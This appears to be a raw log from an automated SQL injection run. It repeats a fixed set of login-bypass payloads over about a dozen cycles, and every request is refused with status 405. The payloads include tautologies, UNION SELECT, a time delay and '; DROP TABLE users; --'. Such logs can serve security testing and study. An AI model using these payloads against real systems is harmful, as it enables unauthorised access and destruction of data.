2026-04-19 16:36:41 | SQLI_BYPASS | cycle=1 | query=' OR '1'='1 | status=405
2026-04-19 16:43:09 | SQLI_BYPASS | cycle=190 | query=admin' OR 'a'='a | status=405
2026-04-19 16:43:10 | SQLI_BYPASS | cycle=190 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:43:10 | SQLI_BYPASS | cycle=190 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:43:10 | SQLI_BYPASS | cycle=191 | query=' OR '1'='1 | status=405
2026-04-19 16:43:10 | SQLI_BYPASS | cycle=191 | query=admin' -- | status=405
2026-04-19 16:43:11 | SQLI_BYPASS | cycle=191 | query=admin' # | status=405
2026-04-19 16:43:11 | SQLI_BYPASS | cycle=191 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:43:11 | SQLI_BYPASS | cycle=191 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:43:11 | SQLI_BYPASS | cycle=191 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:43:11 | SQLI_BYPASS | cycle=191 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:43:11 | SQLI_BYPASS | cycle=191 | query=admin' OR 'a'='a | status=405
2026-04-19 16:43:12 | SQLI_BYPASS | cycle=191 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:43:12 | SQLI_BYPASS | cycle=191 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:43:12 | SQLI_BYPASS | cycle=192 | query=' OR '1'='1 | status=405
2026-04-19 16:43:12 | SQLI_BYPASS | cycle=192 | query=admin' -- | status=405
2026-04-19 16:43:12 | SQLI_BYPASS | cycle=192 | query=admin' # | status=405
2026-04-19 16:43:13 | SQLI_BYPASS | cycle=192 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:43:13 | SQLI_BYPASS | cycle=192 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:43:13 | SQLI_BYPASS | cycle=192 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:43:13 | SQLI_BYPASS | cycle=192 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:43:13 | SQLI_BYPASS | cycle=192 | query=admin' OR 'a'='a | status=405
2026-04-19 16:43:14 | SQLI_BYPASS | cycle=192 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:43:14 | SQLI_BYPASS | cycle=192 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:43:14 | SQLI_BYPASS | cycle=193 | query=' OR '1'='1 | status=405
2026-04-19 16:43:14 | SQLI_BYPASS | cycle=193 | query=admin' -- | status=405
2026-04-19 16:43:15 | SQLI_BYPASS | cycle=193 | query=admin' # | status=405
2026-04-19 16:43:15 | SQLI_BYPASS | cycle=193 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:43:15 | SQLI_BYPASS | cycle=193 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:43:15 | SQLI_BYPASS | cycle=193 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:43:15 | SQLI_BYPASS | cycle=193 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:43:16 | SQLI_BYPASS | cycle=193 | query=admin' OR 'a'='a | status=405
2026-04-19 16:43:16 | SQLI_BYPASS | cycle=193 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:43:16 | SQLI_BYPASS | cycle=193 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:43:16 | SQLI_BYPASS | cycle=194 | query=' OR '1'='1 | status=405
2026-04-19 16:43:16 | SQLI_BYPASS | cycle=194 | query=admin' -- | status=405
2026-04-19 16:43:17 | SQLI_BYPASS | cycle=194 | query=admin' # | status=405
2026-04-19 16:43:17 | SQLI_BYPASS | cycle=194 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:43:17 | SQLI_BYPASS | cycle=194 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:43:17 | SQLI_BYPASS | cycle=194 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:43:18 | SQLI_BYPASS | cycle=194 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:43:18 | SQLI_BYPASS | cycle=194 | query=admin' OR 'a'='a | status=405
2026-04-19 16:43:18 | SQLI_BYPASS | cycle=194 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:43:18 | SQLI_BYPASS | cycle=194 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:43:18 | SQLI_BYPASS | cycle=195 | query=' OR '1'='1 | status=405
2026-04-19 16:43:19 | SQLI_BYPASS | cycle=195 | query=admin' -- | status=405
2026-04-19 16:43:19 | SQLI_BYPASS | cycle=195 | query=admin' # | status=405
2026-04-19 16:43:19 | SQLI_BYPASS | cycle=195 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:43:19 | SQLI_BYPASS | cycle=195 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:43:19 | SQLI_BYPASS | cycle=195 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:43:19 | SQLI_BYPASS | cycle=195 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:43:20 | SQLI_BYPASS | cycle=195 | query=admin' OR 'a'='a | status=405
2026-04-19 16:43:20 | SQLI_BYPASS | cycle=195 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:43:20 | SQLI_BYPASS | cycle=195 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:43:20 | SQLI_BYPASS | cycle=196 | query=' OR '1'='1 | status=405
2026-04-19 16:43:20 | SQLI_BYPASS | cycle=196 | query=admin' -- | status=405
2026-04-19 16:43:21 | SQLI_BYPASS | cycle=196 | query=admin' # | status=405
2026-04-19 16:43:21 | SQLI_BYPASS | cycle=196 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:43:21 | SQLI_BYPASS | cycle=196 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:43:21 | SQLI_BYPASS | cycle=196 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:43:21 | SQLI_BYPASS | cycle=196 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:43:21 | SQLI_BYPASS | cycle=196 | query=admin' OR 'a'='a | status=405
2026-04-19 16:43:22 | SQLI_BYPASS | cycle=196 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:43:22 | SQLI_BYPASS | cycle=196 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:43:22 | SQLI_BYPASS | cycle=197 | query=' OR '1'='1 | status=405
2026-04-19 16:43:22 | SQLI_BYPASS | cycle=197 | query=admin' -- | status=405
2026-04-19 16:43:23 | SQLI_BYPASS | cycle=197 | query=admin' # | status=405
2026-04-19 16:43:23 | SQLI_BYPASS | cycle=197 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:43:23 | SQLI_BYPASS | cycle=197 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:43:23 | SQLI_BYPASS | cycle=197 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:43:24 | SQLI_BYPASS | cycle=197 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:43:24 | SQLI_BYPASS | cycle=197 | query=admin' OR 'a'='a | status=405
2026-04-19 16:43:24 | SQLI_BYPASS | cycle=197 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:43:24 | SQLI_BYPASS | cycle=197 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:43:24 | SQLI_BYPASS | cycle=198 | query=' OR '1'='1 | status=405
2026-04-19 16:43:25 | SQLI_BYPASS | cycle=198 | query=admin' -- | status=405
2026-04-19 16:43:25 | SQLI_BYPASS | cycle=198 | query=admin' # | status=405
2026-04-19 16:43:25 | SQLI_BYPASS | cycle=198 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:43:25 | SQLI_BYPASS | cycle=198 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:43:25 | SQLI_BYPASS | cycle=198 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:43:26 | SQLI_BYPASS | cycle=198 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:43:26 | SQLI_BYPASS | cycle=198 | query=admin' OR 'a'='a | status=405
2026-04-19 16:43:26 | SQLI_BYPASS | cycle=198 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:43:26 | SQLI_BYPASS | cycle=198 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:43:27 | SQLI_BYPASS | cycle=199 | query=' OR '1'='1 | status=405
2026-04-19 16:43:27 | SQLI_BYPASS | cycle=199 | query=admin' -- | status=405
2026-04-19 16:43:27 | SQLI_BYPASS | cycle=199 | query=admin' # | status=405
2026-04-19 16:43:27 | SQLI_BYPASS | cycle=199 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:43:27 | SQLI_BYPASS | cycle=199 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:43:28 | SQLI_BYPASS | cycle=199 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:43:28 | SQLI_BYPASS | cycle=199 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:43:28 | SQLI_BYPASS | cycle=199 | query=admin' OR 'a'='a | status=405
2026-04-19 16:43:28 | SQLI_BYPASS | cycle=199 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:43:29 | SQLI_BYPASS | cycle=199 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:43:29 | SQLI_BYPASS | cycle=200 | query=' OR '1'='1 | status=405
2026-04-19 16:43:29 | SQLI_BYPASS | cycle=200 | query=admin' -- | status=405
2026-04-19 16:43:29 | SQLI_BYPASS | cycle=200 | query=admin' # | status=405
2026-04-19 16:43:29 | SQLI_BYPASS | cycle=200 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:43:29 | SQLI_BYPASS | cycle=200 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:43:30 | SQLI_BYPASS | cycle=200 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:43:30 | SQLI_BYPASS | cycle=200 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:43:30 | SQLI_BYPASS | cycle=200 | query=admin' OR 'a'='a | status=405
2026-04-19 16:43:30 | SQLI_BYPASS | cycle=200 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:43:30 | SQLI_BYPASS | cycle=200 | query=admin' AND (SELECT 1)=1 -- | status=405
